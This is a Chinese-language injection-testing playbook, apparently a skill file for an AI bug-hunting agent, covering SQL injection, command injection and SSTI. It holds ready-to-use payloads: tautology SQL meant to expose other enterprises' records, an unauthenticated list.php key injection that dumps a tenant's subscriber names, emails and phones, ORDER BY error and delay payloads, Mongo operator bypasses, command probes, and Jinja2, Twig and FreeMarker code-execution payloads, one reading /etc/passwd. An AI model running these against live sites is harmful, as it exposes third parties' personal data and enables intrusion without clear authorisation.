---
name: "injection-test"
description: "注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）"
---

> **ravenholt 环境版**：本文件由 `scripts/vendor_src_hunt.py` 按 `profiles/ravenholt.yaml` 生成。
> 技能一律用 `load_skill("src_hunt/<name>")` 按名加载，正文里的旧文件路径只作索引；
> `01`～`10` 指 `src_hunt/0X-*`。旧环境路径/工具名已替换；正文点名的脚本在沙箱里不存在时，改用等价工具，不要停工。

> 进站勾完标准见 `load_skill("src_hunt/01-dig-scope-workflow")` §4.2.1：能看出条数/内容变化的口，每个过滤参都测；只回「请登录」整段 N/A。按栈选探针（JSON/Mongo 操作符、搜索框 ES、Java HQL/SpEL、有模板 SSTI；SQL 面仍走引号/布尔/延时）。405 后换位置不只有换编码。
> 短表「列表筛选项 OR + total」「邮件订阅 iframe 同目录 list」用标题搜。WooYun 统计 / sqlmap --os-shell / 反弹 shell / 英文附件已砍；现场按栈自己变，不靠教材。

# 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

## SQL 注入

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

### 邮件订阅 iframe 同目录 list（短表有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删短表这行。不要对全站同皮客户开资产搜索。

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

### OrderBy 注入：**否定结论也要三重对照**（否则是盲区）

`orderByColumn` / `sort` / `orderBy` / `isAsc` 这类**拼进 `ORDER BY` 的参数**是若依等框架的高发点
（`order by ${orderByColumn} ${isAsc}`）。**但"响应相同"不能直接判不存在**：

- ★★ **结果集为空时判据失效**：若接口返 `total:0, rows:[]`，**参数怎么变响应都逐字节相同** ——
  此时"逐字节同" **既不能证消费也不能证不消费**。这是假阴性高发区。
- ★★ **必须凑齐三重对照**才可写否定：

  | 对照 | 目的 |
  |---|---|
  | 合法值 A / 合法值 B（按排序会换序） | 看**排序是否真的变**（**前提：结果非空**） |
  | **非法列名** `zzz_nope_col` | 若参数真进 `ORDER BY`，多数 DB 会**报错** |
  | **报错函数** `extractvalue(1,concat(0x7e,version()))` / `cast(version() as int)` | 报 XML/类型错 ⇒ 参数进 SQL |
  | **延时** `(case when (select sleep(3))then 1 else 2 end)` | 无回显时的唯一可靠判据 |

- 亲例（2026-10-03 cdcas）：`orderByColumn` 五形态（`cast(1 as int)` / `cast(version() as int)` /
  `startTime` / `startTime,id` / `zzz_nope_col`）**响应逐字节同 + 耗时全 ≈0.24s（无延时）+ 非法列不报错**，
  且该接口 `total:0` ⇒ 只能写「**该参数未进入 SQL**」，**不写"存在注入"，也不写"已排除注入点"**。
- 提示：新版若依有 `SqlUtil.escapeOrderBySql`（只放字母/数字/下划线/逗号）⇒ 括号直接会被过滤掉，
  所以**报错函数不报错 ≠ 无注入，可能正是白名单生效**。要用延时形态交叉验证。

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页。探针 `;id` / `|id` / `$(id)` / 延时 `sleep 5`。证伪即可，不要本机反弹 shell 当教材。

## SSTI（服务端模板注入）

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### 常见框架利用

```python
# Jinja2 (Python/Flask)
{{config}}                           # 信息泄露
{{''.__class__.__mro__[2].__subclasses__()}}  # 获取类
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
